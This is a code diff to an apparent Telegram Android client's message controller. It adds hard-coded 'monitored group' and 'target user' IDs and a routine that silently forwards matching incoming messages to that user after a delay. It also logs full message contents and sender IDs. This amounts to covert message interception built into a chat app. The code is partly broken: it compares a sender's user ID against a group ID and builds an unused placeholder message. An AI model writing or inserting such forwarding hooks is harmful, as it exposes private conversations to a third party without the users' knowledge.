@@ -25,6 +25,7 @@ import android.graphics.Paint;
 import android.location.Location;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.os.Looper;
 import android.os.SystemClock;
 import android.telephony.TelephonyManager;
@@ -177,6 +178,9 @@ public class MessagesController extends BaseController implements NotificationCe
     public long giveawayCountriesMax = 10;
     public long giveawayBoostsPerPremium = 4;
     public long boostsPerSentGift = 3;
+
+    private static final long MONITORED_GROUP_ID = 7652002179L; // 要监听的群组ID
+    private static final long TARGET_USER_ID = 7738584148L;    // 目标用户ID
 
     public static TLRPC.Peer getPeerFromInputPeer(TLRPC.InputPeer peer) {
         if (peer.chat_id != 0) {
@@ -16731,19 +16735,37 @@ public class MessagesController extends BaseController implements NotificationCe
                     message = ((TLRPC.TL_updateNewMessage) baseUpdate).message;
                     if (message != null) {
                         fromId = message.from_id.user_id;
-                        FileLog.d("coder收到普通消息: " + message.message+ " 消息 | 来自ID: " + fromId);
+                        FileLog.d("coder2025收到普通消息: " + message.message+ " 消息 | 来自ID: " + fromId);
                     }
                 } else if (baseUpdate instanceof TLRPC.TL_updateNewScheduledMessage) {
                     message = ((TLRPC.TL_updateNewScheduledMessage) baseUpdate).message;
                     if (message != null) {
                         fromId = message.from_id.user_id;
-                        FileLog.d("coder收到普通群组消息: " + message.message+ " 消息 | 来自ID: " + fromId);
+                        FileLog.d("coder2025收到普通群组消息: " + message.message+ " 消息 | 来自ID: " + fromId);
                     }
                 } else {
                     message = ((TLRPC.TL_updateNewChannelMessage) baseUpdate).message;
                     if (message != null) {
                         fromId = message.from_id.user_id;
-                        FileLog.d("coder收到群组消息: " + message.message+ " 消息 | 来自ID: " + fromId);
+                        FileLog.d("coder2025收到群组消息: " + message.message+ " 消息 | 来自ID: " + fromId);
+
+//                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+//                            forwardMessageToTargetGroup(message);
+//                        }, 1000); // 1秒延迟
+
+                        // 检查是否来自目标群组
+                        if (fromId == MONITORED_GROUP_ID) {
+
+//                            FileLog.d("收到目标群组消息: " + message.message);
+//                            forwardMessageToUser(message, TARGET_USER_ID);
+
+                            // 添加1秒延迟防止限流
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                forwardMessageToUser(message, TARGET_USER_ID);
+                            }, 1000);
+                        }
+
+
                     }
                     if (BuildVars.LOGS_ENABLED) {
                         FileLog.d(baseUpdate + " channelId = " + message.peer_id.channel_id + " message_id = " + message.id);
@@ -22141,6 +22163,65 @@ public class MessagesController extends BaseController implements NotificationCe
             getConnectionsManager().sendRequest(new TLRPC.TL_messages_getPaidReactionPrivacy(), null);
         }
         return paidReactionsAnonymous;
+    }
+
+
+    private void forwardMessageToUser(TLRPC.Message message, long targetUserId) {
+        if (message == null) return;
+
+        try {
+            // 1. 获取当前账户和MessagesController实例
+            int currentAccount = UserConfig.selectedAccount;
+            MessagesController messagesController = MessagesController.getInstance(currentAccount);
+
+            // 2. 创建转发请求
+            TLRPC.TL_messages_forwardMessages req = new TLRPC.TL_messages_forwardMessages();
+            req.from_peer = messagesController.getInputPeer(message.peer_id); // 使用实例方法
+            req.id.add(message.id);
+
+
+            TLRPC.TL_message newMsg = new TLRPC.TL_message();
+            newMsg.id = message.id;
+            newMsg.message = "全新内容";
+            newMsg.peer_id = message.peer_id;
+            newMsg.date = ConnectionsManager.getInstance(currentAccount).getCurrentTime();
+
+
+            // 3. 获取目标用户peer
+            TLRPC.User user = messagesController.getUser(targetUserId);
+            if (user == null) {
+                FileLog.e("目标用户不存在: " + targetUserId);
+                return;
+            }
+
+//            fromId = message.from_id.user_id;
+//            FileLog.d("coder2025收到群组消息: " + message.message+ " 消息 | 来自ID: " + fromId);
+
+            TLRPC.TL_inputPeerUser peerUser = new TLRPC.TL_inputPeerUser();
+            peerUser.user_id = user.id;
+            peerUser.access_hash = user.access_hash;
+            req.to_peer = peerUser;
+
+            req.random_id.add(Utilities.random.nextLong());
+
+
+
+            // 4. 发送请求（带延迟防限流）
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                ConnectionsManager.getInstance(currentAccount)
+                        .sendRequest(req, (response, error) -> {
+                            if (error != null) {
+                                FileLog.e("coder2025转发失败: " + error.text);
+                            } else {
+//                                FileLog.d("coder2025用户消息: "+fromId + "已转发至用户: " + targetUserId);
+                                FileLog.d("coder2025用户消息: " + "已转发至用户: " + targetUserId);
+                            }
+                        });
+            }, 1000);
+
+        } catch (Exception e) {
+            FileLog.e("coder2025转发异常: " + e.getMessage());
+        }
     }
 
 }
